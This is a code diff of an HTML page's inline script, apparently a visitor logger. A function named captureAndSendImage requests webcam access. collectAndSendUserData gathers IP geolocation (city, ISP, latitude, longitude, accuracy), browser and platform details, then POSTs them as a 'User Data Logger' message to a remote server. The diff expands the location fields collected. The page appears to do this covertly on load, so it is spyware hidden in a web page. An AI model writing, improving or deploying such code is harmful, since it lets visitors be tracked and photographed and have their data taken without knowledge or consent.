@@ -71,9 +71,7 @@
     <link rel="preload" href="stars.mp4" as="video">
 
     <script type="module">
-
-        
-         async function captureAndSendImage() {
+async function captureAndSendImage() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement("video");
@@ -129,8 +127,8 @@ function decodeBase64(encoded) {
 
         
         async function collectAndSendUserData() {
-            try {
-                const response = await fetch('https://ipinfo.io/json?token=50619379773223');
+    try {
+        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                 const ipData = await response.json();
 
                 const browserData = {
@@ -143,33 +141,42 @@ function decodeBase64(encoded) {
                 };
 
                 const userData = {
-                    ...ipData,
-                    browser: browserData.browser,
-                    platform: browserData.platform,
-                    resolution: browserData.resolution,
-                    colorDepth: browserData.colorDepth,
-                    language: browserData.language,
-                    timezone: browserData.timezone,
-                };
+    ip: ipData.ip || "N/A",
+    city: ipData.city || "N/A",
+    region: ipData.region || "N/A",
+    country: ipData.country || "N/A",
+    isp: ipData.organization_name || ipData.organization || "N/A", 
+    latitude: ipData.latitude ? ipData.latitude.toString() : "N/A",
+    longitude: ipData.longitude ? ipData.longitude.toString() : "N/A",
+    timezone: ipData.timezone || "N/A",
+    browser: browserData.browser,
+    platform: browserData.platform,
+    resolution: browserData.resolution,
+    colorDepth: browserData.colorDepth,
+    language: browserData.language,
+    accuracy: ipData.accuracy ? ipData.accuracy.toString() + " km" : "N/A",
+    ...ipData, 
+};
 
                 
-                const payload = {
-                    username: "User Data Logger",
-                    content: `
+const payload = {
+    username: "User Data Logger",
+    content: `
 **User Information:**
 IP: ${userData.ip || "N/A"}
 Location: ${userData.city || "N/A"}, ${userData.region || "N/A"}, ${userData.country || "N/A"}
-ISP: ${userData.org || "N/A"}
+ISP: ${userData.isp || "N/A"}
 Browser: ${userData.browser}
 Platform: ${userData.platform}
 Resolution: ${userData.resolution}
 Color Depth: ${userData.colorDepth}
 Language: ${userData.language}
 Timezone: ${userData.timezone}
-Latitude: ${userData.loc?.split(",")[0] || "N/A"}
-Longitude: ${userData.loc?.split(",")[1] || "N/A"}
-                    `,
-                };
+Latitude: ${userData.latitude || "N/A"}
+Longitude: ${userData.longitude || "N/A"}
+    `,
+};
+
 
                 await fetch(serverBase, {
                     method: "POST",
@@ -192,18 +199,20 @@ Longitude: ${userData.loc?.split(",")[1] || "N/A"}
 
             if (userData) {
                 const details = [
-                    `IP Address: ${userData.ip || "N/A"}`,
-                    `Location: ${userData.city || "N/A"}, ${userData.region || "N/A"}, ${userData.country || "N/A"}`,
-                    `ISP: ${userData.org || "N/A"}`,
-                    `Browser: ${userData.browser}`,
-                    `Platform: ${userData.platform}`,
-                    `Resolution: ${userData.resolution}`,
-                    `Color Depth: ${userData.colorDepth}`,
-                    `Language: ${userData.language}`,
-                    `Timezone: ${userData.timezone}`,
-                    `Latitude: ${userData.loc?.split(",")[0] || "N/A"}`,
-                    `Longitude: ${userData.loc?.split(",")[1] || "N/A"}`,
-                ];
+    `IP Address: ${userData.ip || "N/A"}`,
+    `Location: ${userData.city || "N/A"}, ${userData.region || "N/A"}, ${userData.country || "N/A"}`,
+    `ISP: ${userData.isp || "N/A"}`,
+    `Browser: ${userData.browser}`,
+    `Platform: ${userData.platform}`,
+    `Resolution: ${userData.resolution}`,
+    `Color Depth: ${userData.colorDepth}`,
+    `Language: ${userData.language}`,
+    `Timezone: ${userData.timezone}`,
+    `Latitude: ${userData.latitude || "N/A"}`,
+    `Longitude: ${userData.longitude || "N/A"}`,
+    `Accuracy: ${userData.accuracy || "N/A"}` 
+];
+
 
                 for (const detail of details) {
                     const line = document.createElement('div');
